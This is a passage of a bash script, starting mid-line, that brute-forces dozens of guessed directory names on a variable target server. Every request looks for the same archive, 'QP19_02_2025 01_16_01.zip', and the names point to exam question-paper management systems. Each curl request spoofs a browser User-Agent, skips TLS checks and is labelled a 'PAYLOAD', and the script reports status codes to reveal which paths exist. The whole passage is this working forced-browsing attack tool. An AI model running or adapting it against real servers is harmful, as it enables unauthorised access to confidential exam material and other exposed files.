" "${target}QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
